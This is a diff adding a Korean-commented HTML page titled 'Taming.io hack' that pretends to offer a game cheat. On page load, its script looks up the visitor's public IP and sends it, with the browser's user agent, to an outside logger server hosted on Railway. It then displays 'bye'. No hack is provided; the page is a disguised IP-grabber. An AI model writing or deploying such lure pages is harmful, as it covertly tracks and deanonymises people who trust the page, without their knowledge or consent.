@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Taming.io hack</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>taming.io hack!</h1>
+    <p id="status">wait.....</p>
+
+    <script>
+        window.onload = function() {
+            const statusElement = document.getElementById('status');
+            
+            // 1. 방문자의 IP를 알아냅니다.
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    const userAgent = navigator.userAgent;
+
+                    // 2. 알아낸 IP를 나의 Railway 서버로 전송합니다.
+                    // ★★★★★ 이 부분을 당신의 주소로 바꾼 코드입니다! ★★★★★
+                    const loggerServerUrl = 'https://aaa-production-efa7.up.railway.app/log-ip'; 
+
+                    fetch(loggerServerUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ ip: userIp, userAgent: userAgent })
+                    })
+                    .then(res => res.json())
+                    .then(logResult => {
+                        console.log('Log server response:', logResult.message);
+                        statusElement.textContent = 'bye';
+                    })
+                    .catch(err => {
+                        console.error('Failed to send log to server:', err);
+                        statusElement.textContent = '오류가 발생했습니다.';
+                    });
+                })
+                .catch(error => {
+                    console.error('Failed to get IP address:', error);
+                });
+        };
+    </script>
+</body>
+</html>
